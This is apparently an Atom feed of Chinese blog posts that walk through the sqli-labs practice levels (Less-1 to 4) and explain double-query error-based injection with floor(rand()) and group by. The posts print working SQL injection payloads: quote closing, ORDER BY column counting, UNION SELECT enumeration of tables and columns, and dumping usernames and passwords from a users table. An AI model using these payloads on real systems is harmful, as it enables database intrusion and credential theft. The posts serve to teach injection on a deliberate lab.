    <summary type="html">&lt;h1 id=&quot;Less-5&quot;&gt;&lt;a href=&quot;#Less-5&quot; class=&quot;headerlink&quot; title=&quot;Less-5&quot;&gt;&lt;/a&gt;Less-5&lt;/h1&gt;&lt;p&gt;正确的思路是盲注。从源代码中可以看到，运行返回结果正确的时候只返回 you are in….，不会返回数据库</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>双查询注入</title>
    <link href="http://example.com/2020/11/23/wd/"/>
    <id>http://example.com/2020/11/23/wd/</id>
    <published>2020-11-23T01:50:38.000Z</published>
    <updated>2020-11-29T03:23:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h1><p>原理：</p><p>　　rand()：随机函数</p><p>　　floor()：取整函数</p><p>　　count()：汇总函数</p><p>　　group by values：分组函数</p><p>　　当在一个聚合函数，比如count函数后面使用分组语句就会把查询的一部分以错误的形式显示出来；</p><p>先来看看子查询 select，就是在一个select语句中还含有一个select语句叫做子查询；</p><p>看个例子： Select concat ((select database()));</p><p>在查询的时候，子查询的select会把当前的数据库反馈给concat函数 （concat函数就是用来连接里面的结果）</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">rand</span>(<span class="params"></span>)</span>;</span><br><span class="line">+--------------------+</span><br><span class="line">| rand()             |</span><br><span class="line">+--------------------+</span><br><span class="line">| <span class="number">0.6080478007048814</span> |</span><br><span class="line">+--------------------+</span><br><span class="line">注：rand函数是一个随机函数，所以每次出现的值不一样;会出现<span class="number">0</span><span class="number">-1</span>之间的值；</span><br></pre></td></tr></table></figure><p>接下来执行floor函数</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">floor</span>(<span class="params">rand(</span>)*2)</span>;</span><br><span class="line">+-----------------+</span><br><span class="line">| floor(rand()*<span class="number">2</span>) |</span><br><span class="line">+-----------------+</span><br><span class="line">|               <span class="number">1</span> |</span><br><span class="line">+-----------------+</span><br><span class="line">注：floor函数是把小数进行取整；</span><br></pre></td></tr></table></figure><p>rand() 返回大于0小于1的小数，乘以2之后就成了小于0小于2了。然后对结果进行取整。就只能是0或1了。也就是这个查询的结果不是1，就是0</p><p>接下来进行测试</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">concat</span>(<span class="params">(<span class="keyword">select</span> database(</span>)),<span class="title">floor</span>(<span class="params">rand(</span>)*2))；</span></span><br><span class="line"><span class="function">+-------------------------------------------------+</span></span><br><span class="line"><span class="function">|<span class="title">concat</span>(<span class="params">(<span class="keyword">select</span> database(</span>)),<span class="title">floor</span>(<span class="params">rand(</span>)*2))      |</span></span><br><span class="line"><span class="function">+-------------------------------------------------+</span></span><br><span class="line"><span class="function">| security0                                       |</span></span><br><span class="line"><span class="function">| security1                                       |</span></span><br><span class="line"><span class="function">+-------------------------------------------------+</span></span><br></pre></td></tr></table></figure><p> SELECT database() 这个就返回数据库名，这里就是security了。然后FLOOR(RAND()*2)这个上面说过了。不是0，就是1.然后把这两个的结果进行concat连接，那么结果不是security0就是security1了。</p><p>接下来再加入group by 语句</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">count</span>(<span class="params">*</span>),<span class="title">concat</span>(<span class="params">(<span class="keyword">select</span> database(</span>)),<span class="title">floor</span>(<span class="params">rand(</span>)*2)) <span class="keyword">as</span> test <span class="keyword">from</span></span></span><br><span class="line"><span class="function">information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> test</span>;</span><br><span class="line">+----------+-----------+</span><br><span class="line">| count(*) | test      |</span><br><span class="line">+----------+-----------+</span><br><span class="line">|       <span class="number">33</span> | security0 |</span><br><span class="line">|       <span class="number">49</span> | security1 |</span><br><span class="line">+----------+-----------+</span><br><span class="line"><span class="number">2</span> <span class="function">rows <span class="keyword">in</span> <span class="title">set</span> (<span class="params"><span class="number">0.00</span> sec</span>)</span></span><br></pre></td></tr></table></figure><p>我们把concat((select database()), floor(rand()*2)) 这个结果取了一个别名test ，然后使用他进行分组。这样相同的security0分到一组，security1分到一组。</p><p>这里的database()可以替换成任何你想查的函数，比如version(), user(), datadir()或者其他的查询。比如查表啊，查列啊。</p><p>最后再加上count（*）函数</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">count</span>(<span class="params">*</span>), <span class="title">concat</span>(<span class="params">(<span class="keyword">select</span> database(</span>)), <span class="title">floor</span>(<span class="params">rand(</span>)*2))<span class="keyword">as</span> qqq <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> qqq</span>;</span><br></pre></td></tr></table></figure><h3 id="count函数"><a href="#count函数" class="headerlink" title="count函数"></a>count函数</h3><p>count()是一个聚合函数，对于返回的结果集，一行行地判断，如果count函数的参数不是NULL，累计值就加1，否则不加。最后返回累计值。</p><p> *count(id)**</p><p>InnoDB引擎会遍历整张表，把每一行的id值都取出来，返回给server层。server层拿到id后，判断是不可能为空的，就按行累加。</p><p><strong>count(1)</strong></p><p>InnoDB引擎遍历整张表，但不取值。server层对于返回的每一行，放一个数字1进去，判断是不可能为空的，按行累加。</p><p><strong>count(字段)</strong></p><p>如果这个“字段”是定义为not null的话，一行行地从记录里面读出这个字段，判断不能为null，按行累加；如果这个字段定义允许为null，那么执行的时候，判断到有可能是null，还要把值取出来再判断一下，不是null才累加。</p><p><strong>count(*)</strong></p><p>不会把全部字段取出来，而是专门做了优化，不取值。count(*)肯定不是null，按行累加。</p><p> 按照效率排序的话，count(字段)&lt;count(主键id)&lt;count(1)≈count(<em>)，所以建议尽量使用count(</em>)</p><p>count(id)虽然走的索引，但是还是需要一行一行的扫描才能统计出来总数，所以效率没有那么高。</p><h3 id="注"><a href="#注" class="headerlink" title="注"></a>注</h3><p>*<em>“通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor(random(0)<em>2)<em>的不确定性，即可能为0也可能为1（group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中则更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by floor(random(0)2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。具体原理参考：<a href="http://www.mysqlops.com/2012/05/15/mysql-sql-analyze.html%EF%BC%89%E3%80%82%E2%80%9D">http://www.mysqlops.com/2012/05/15/mysql-sql-analyze.html）。”</a></em></em></em></p><p><strong>结论是：当与临时表里面的值进行比较，如果不同，就插入，但是插入的时候又计算了一次，所以如果插入时计算的值与直接比较的值不一样，则报错！</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;双查询注入&quot;&gt;&lt;a href=&quot;#双查询注入&quot; class=&quot;headerlink&quot; title=&quot;双查询注入&quot;&gt;&lt;/a&gt;双查询注入&lt;/h1&gt;&lt;p&gt;原理：&lt;/p&gt;
&lt;p&gt;　　rand()：随机函数&lt;/p&gt;
&lt;p&gt;　　floor()：取整函数&lt;/p&gt;
&lt;p&gt;　　co</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>sql-Less3，4</title>
    <link href="http://example.com/2020/11/20/sql-3/"/>
    <id>http://example.com/2020/11/20/sql-3/</id>
    <published>2020-11-20T12:57:41.000Z</published>
    <updated>2020-11-28T13:36:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><h2 id="注入点闭合的问题"><a href="#注入点闭合的问题" class="headerlink" title="注入点闭合的问题"></a>注入点闭合的问题</h2><p>首先先讲讲闭合符的问题</p><p>一般注入点闭合无非是 ‘ , “ , ‘) , “)等各种组合(逗号是分隔符)</p><p>一般的代码：$id=$_GET[‘id’]; </p><p>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; </p><p>就是这里，对id进行了修饰，用’（单引号）把id括了起来。所以我们构造语句的时候，一是要把我们构造的语句‘逃逸’出来，二是要把结构进行补全或者适当的注释。</p><p>注释可以用–+;– -;#把后面的’或者多余的修饰符注释掉</p><p><strong>less1-</strong>-根据注入位置数据类型可将sql注入分为：数字型和字符型。用 ?id=1 和?id=1’ 探测是否存在SQL注入。发现前者返回正常，后者会出现mysql语法错误。<br><strong>错误:</strong> ’ ‘1’’ LIMIT 0.1 ’<br><strong>SQL:</strong> select login_name,password from admin where id=‘id’ limit 0,1;</p><p><strong>less2</strong>–<br><strong>错误:</strong> ’ ’ LIMIT 0,1 ’<br><strong>SQL:</strong> select login_name ,password from admin where id=id limit 0,1;</p><p>less3–<br><strong>错误 ：</strong> ’ ‘1’’) LIMIT 0,1 ’<br><strong>SQL:</strong> select login_name,password from admin where id=(‘id’) limit 0,1;<br><strong>构造闭合</strong>：?id=1’) –+ 或者 ?id=1’) –%20 //–+表示注释后面的内容</p><p>less-4– 双引号绕过：<br><strong>错误：</strong>‘ “1\”) LIMIT 0,1 ’ 或者 ’ “ 1””) LIMIT 0,1 ’ //这里的\对 “ 进行了转义. //这里 “ ” 使里面的单引号转化为 1<br><strong>SQL:</strong> select login_name,password from admin where id=(“ID”) limit 0,1<br><strong>构造闭合：</strong> ?id=1”) –+ 或者 ?id=1”) –%20</p><p>正片开始</p><p>输入?id=1’</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/ruAMsa53pVQWN7FLK88i5jZ4wNsSTum2TzpklTuDTuNTqDdv.qsP8FpIhcFuZAwyuuScn1p1rQ1.NdrVkosLVgrnk3F6OccCflh4yiIDuTs!/b&bo=GQZlAQAAAAADB1k!&rf=viewer_4" alt="img"></p><p>出现报错，可知加‘）注意是’ 不是 ‘</p><p>接下来就是和前面的关一样了。</p><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><p>和第三关一样</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/ruAMsa53pVQWN7FLK88i5iK1LfZHtBibppwAzKxkanJ2OgeS8d8.sQ5Ku.63SDWJ2204CbPYvIDdmidI4KrgaTI6WU8l2tyIFtvzT.Z*mP0!/b&bo=BAbWAQAAAAADB*c!&rf=viewer_4" alt="img"></p><p>知道要加“）</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcebXzZr*awVGjLYjCtYYYswMysyppEG4IxMmoIVJjeEb9N3TCw8cukh6ZVDzzfI4xOdLDk9PAOookEiKGIfe4Hc!/b&bo=jgWoAQAAAAADJyA!&rf=viewer_4" alt="img"></p><p>其他就和上面一样</p><p>ye</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Less-3&quot;&gt;&lt;a href=&quot;#Less-3&quot; class=&quot;headerlink&quot; title=&quot;Less-3&quot;&gt;&lt;/a&gt;Less-3&lt;/h1&gt;&lt;h2 id=&quot;注入点闭合的问题&quot;&gt;&lt;a href=&quot;#注入点闭合的问题&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>sql-2</title>
    <link href="http://example.com/2020/11/17/sql-2/"/>
    <id>http://example.com/2020/11/17/sql-2/</id>
    <published>2020-11-17T11:23:08.000Z</published>
    <updated>2020-11-26T11:51:34.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>第二关和第一关思路是一样的</p><p>Less-2和Less-1唯一的区别就是id类型不同了，Less-2的id是一个int类型</p><p>按照上一篇的检测方法</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mceI02rOuVWHPDHknllOSQ6Kn0S2kgH9X2PWzyouoopc6XTN98hkf59BkDGTfVQEXApE.2sb3uS3RIzlzPaVbbz0!/b&bo=2wb8AQAAAAADJyI!&rf=viewer_4" alt="img"></p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mceI02rOuVWHPDHknllOSQ6LcQMVKB3MiTtpC0OlzZxiyq4XxKG555*p56hYrIyqBX39d7wLznEoBcZrQQY8HhBo!/b&bo=jAbLAQAAAAADJ0I!&rf=viewer_4" alt="img"></p><p><img src="/2020/11/17/sql-2/Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20201117193309346.png" alt="image-20201117193309346"></p><p>接下来就和第一关的一样了</p><p>查看多少列</p><p>id=1 order by 3–+ </p><p>查看什么地方有回显</p><p>id=-1 union select 1,2,3–+</p><p>爆库</p><p>id=-1 union select 1,2,database()–+</p><p>爆表名</p><p>id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=‘security’ –+</p><p>爆列名</p><p>id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’ –+</p><p>爆数据</p><p>?id=-1 union select 1,2,group_concat(concat_ws(‘,’,username,password) separator ‘|’) from users –+</p><h2 id="特殊方法"><a href="#特殊方法" class="headerlink" title="特殊方法"></a>特殊方法</h2><p>or 1=1 或者 and 1=1等直接爆密码，但只能爆出一组。</p><blockquote><p><a href="http://localhost/sql/Less-2/?id=1">http://localhost/sql/Less-2/?id=1</a> or 1=1</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20190812175007694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjMyNjY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Less-2&quot;&gt;&lt;a href=&quot;#Less-2&quot; class=&quot;headerlink&quot; title=&quot;Less-2&quot;&gt;&lt;/a&gt;Less-2&lt;/h2&gt;&lt;p&gt;第二关和第一关思路是一样的&lt;/p&gt;
&lt;p&gt;Less-2和Less-1唯一的区别就是id类型不同了，Less-</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>sql-less-1</title>
    <link href="http://example.com/2020/11/15/sql-1/"/>
    <id>http://example.com/2020/11/15/sql-1/</id>
    <published>2020-11-15T11:17:05.000Z</published>
    <updated>2020-11-26T11:52:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><h2 id="1、判断是数字型还是字符型"><a href="#1、判断是数字型还是字符型" class="headerlink" title="1、判断是数字型还是字符型"></a>1、判断是数字型还是字符型</h2><p>分别添加<code>?id=1, ?id=2, ?id=2-1</code> ，观察页面的变化，判断是字符型还是数字型。<br>如果id=2-1 与 id=1的页面一样，就是数字型；如果id=2-1与id=2的页面一样，就是字符型</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/ruAMsa53pVQWN7FLK88i5rmPsuPkLeXfPlwrW2ZqM*BRLC1MCTDLaKvT4kc530Gjj1fkGRBDTnoyLz4jfEQ8s0eIFp7gJZdjib*M2F1TH6Q!/b&bo=lwWzAQAAAAADBwI!&rf=viewer_4" alt="img"></p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/ruAMsa53pVQWN7FLK88i5pUhhJ4Li8hKnvKbpDPn0YQ..8POlvgrMGJgYQwhpp5E7RThyMUbPDhZpCjaPLyiYbY6wms4VrNsJ4vtoo2GD6s!/b&bo=oAW1AQAAAAADBzM!&rf=viewer_4" alt="img"></p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/ruAMsa53pVQWN7FLK88i5pUhhJ4Li8hKnvKbpDPn0YTLButVEP4jvrKEnalndjykaTY3REv*KQU8XUQwaqzcVhGwVDMgWtHWh4u*8hjpSuA!/b&bo=7wW9AQAAAAADB3Q!&rf=viewer_4" alt="img"></p><p>因为1与2-1一样，它是字符型。</p><h2 id="2、通过报错判断闭合符"><a href="#2、通过报错判断闭合符" class="headerlink" title="2、通过报错判断闭合符"></a>2、通过报错判断闭合符</h2><p>在id=2后面分别加上<code>&#39;</code> , <code>&quot;</code> 即单引号，双引号<img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcYPTCFYb7VsCKyA.I3XRM2hGIE6X2oEzyxefvtrZH*m1FwmBxsRGc0hU7meIMFcJuTgRe2rkbq6IZxWZKu2MhOY!/b&bo=ogamAQAAAAADJwE!&rf=viewer_4" alt="img"></p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcbBuEiYwrfdylpOHWKgV6UpeL.FeseKZZ0Fi0Q8oQr7ykNiQ1nTa1RMgxmLUoVccmb2FDQ.LEPUNtBTl2N4oCGk!/b&bo=CwbPAQAAAAADJ8E!&rf=viewer_4" alt="img"></p><p>发现加<code>&#39;</code>时报错了，而加<code>&quot;</code>是正常显示，说明闭合符是<code>&#39;</code>。所以我们应该使用<code>&#39;</code>，让它闭合。</p><h2 id="3、确认查询的字段数量"><a href="#3、确认查询的字段数量" class="headerlink" title="3、确认查询的字段数量"></a>3、确认查询的字段数量</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span><span class="keyword">sql</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3 --+</span></span><br></pre></td></tr></table></figure><p>在后面分别添加<code>?id=1&#39;order by 1 --+</code>，<code>?id=1&#39;order by 2 --+</code>，<code>?id=1&#39;order by 3 --+</code>……<code>order by n --+</code>，观察是否报错</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcbBuEiYwrfdylpOHWKgV6UpAOehh1KNPeUkjXbNv74TDdc6C040XZC6KfnS7NA.ppa6X6QkPLpabd7hk2g2Lqk4!/b&bo=6AW.AQAAAAADJ1A!&rf=viewer_4" alt="img"></p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcbBuEiYwrfdylpOHWKgV6UpjVGRR.oq335vjk5Q91hiJf4V6r50bo8HKym*dWt9VAqdnhg8nJcnRpr.dhVNaYxc!/b&bo=7QV.AQAAAAADF6U!&rf=viewer_4" alt="img"></p><p>我们发现在by 3的时候还是正常的，而by 4的时候就没了，说明要查询的字段数量是3个。</p><h2 id="4、确认占位信息"><a href="#4、确认占位信息" class="headerlink" title="4、确认占位信息"></a>4、确认占位信息</h2><p>把id的值换成-1，不让它显示正常的值，然后在后面加上union select 1,2,3 –+。查看字段的占位信息。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span><span class="keyword">sql</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcXJEaw.i6Vpz.UsbtRrRbHX*g7QLq3cfM.toC2XFspVWTTSX3VPE1Agzyn7S6QDnDN9wBFOeB9F1ME9T9RDf9pY!/b&bo=6QXVAQAAAAADJzo!&rf=viewer_4" alt="img"></p><h2 id="5、找库名"><a href="#5、找库名" class="headerlink" title="5、找库名"></a>5、找库名</h2><p><code>…… union select 1,2,database() --+</code>，把3换成database(),即在输出3的地方输出数据库名。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span><span class="keyword">sql</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,2,database() --+</span></span><br><span class="line"><span class="string">1</span></span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcbBuEiYwrfdylpOHWKgV6UqglbGydAqjcHZPgULUM6sYF90Fc5VrdxlrvpaUSyQrPf6Ti.NzMP8xIeihL6i*s7w!/b&bo=yAW1AQAAAAADJ3s!&rf=viewer_4" alt="img"><br>可以看到数据库名为security，接下来查询表Mysql有一个系统数据库<strong>information_schema</strong>，存储着所有的数据库的相关信息，一般的，我们利用该表可以进行一次完整的注入，group_concat是一个函数，当然你也可以用其他函数，这句话的意思就是从information_schema这个库里查security这个数据库里的所有表。`</p><h2 id="6、查表名"><a href="#6、查表名" class="headerlink" title="6、查表名"></a>6、查表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span><span class="keyword">sql</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcXJEaw.i6Vpz.UsbtRrRbHVFhj7E*LUj6zdBOyC9FdNWzAuV*kgnL76bNwY*f18i*KteyH0u*2MAeUYF9gIPn0M!/b&bo=DAb2AQAAAAADJ*8!&rf=viewer_4" alt="img"></p><p>group_concat()是把要输出的内容都放在一个分组里输出，如果不加的话，就只会输出第一个表名。</p><h2 id="7、找表字段"><a href="#7、找表字段" class="headerlink" title="7、找表字段"></a>7、找表字段</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sql&#x2F;Less-1&#x2F;?id&#x3D;-1&#39;union select 1,2,group_concat(column_name) from information_schema.COLUMNs where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;--+</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcXJEaw.i6Vpz.UsbtRrRbHVRFCIvzoJTXs*H*KnDzeLzXYcL4G4vwSLfUt2NnvGvsd0aXKrJ6qks1GKvE3OYpfI!/b&bo=mwW.AQAAAAADJyM!&rf=viewer_4" alt="img"></p><p>users表里有id，username，password三个字段。</p><h2 id="8、找用户名和密码"><a href="#8、找用户名和密码" class="headerlink" title="8、找用户名和密码"></a>8、找用户名和密码</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span><span class="keyword">sql</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 01,2,group_concat(concat_ws(&#x27;</span>,<span class="string">&#x27;,username,password) SEPARATOR &#x27;</span><span class="operator">|</span><span class="string">&#x27;) from users --+</span></span><br><span class="line"><span class="string">1</span></span><br></pre></td></tr></table></figure><p>账号密码就出来了<br>不同用户以<code>|</code>分割，账号密码以<code>,</code>隔开</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mcXJEaw.i6Vpz.UsbtRrRbHW76VawrqiLL0edbSIW0Kbu7TJBEDp0.7ADJcvlAs6rFIsaYfn4cpLKaGEzj*zHLOQ!/b&bo=cwe9AQAAAAADF*o!&rf=viewer_4" alt="img"></p><h2 id="over"><a href="#over" class="headerlink" title="over"></a>over</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Less-1&quot;&gt;&lt;a href=&quot;#Less-1&quot; class=&quot;headerlink&quot; title=&quot;Less-1&quot;&gt;&lt;/a&gt;Less-1&lt;/h1&gt;&lt;h2 id=&quot;1、判断是数字型还是字符型&quot;&gt;&lt;a href=&quot;#1、判断是数字型还是字符型&quot; class=&quot;he</summary>
      
    
    
    
    
  </entry>
  
</feed>
